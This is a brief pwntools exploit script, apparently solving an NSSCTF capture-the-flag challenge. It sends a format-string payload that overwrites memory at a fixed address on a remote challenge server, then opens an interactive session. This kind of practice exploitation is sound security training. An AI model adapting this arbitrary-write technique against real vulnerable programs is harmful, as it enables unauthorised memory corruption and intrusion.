from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28171)

payload=fmtstr_payload(6,{0x4040a0:0x2333})
io.sendafter(b".\n",payload)


io.interactive()